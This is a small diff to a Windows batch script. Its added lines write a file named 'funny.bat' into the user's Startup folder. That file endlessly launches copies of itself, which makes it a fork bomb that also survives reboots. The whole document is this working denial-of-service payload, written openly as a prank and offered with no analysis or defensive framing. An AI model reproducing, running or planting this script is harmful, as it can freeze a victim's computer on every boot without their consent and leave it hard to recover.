@@ -1,4 +1,8 @@
 @echo off 
+echo :funny > funny.bat
+echo cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" >> funny.bat
+echo start funny.bat >> funny.bat
+echo goto :funny >> funny.bat
 cd "%AppData%/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 echo :funny > funny.bat
 echo cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" >> funny.bat
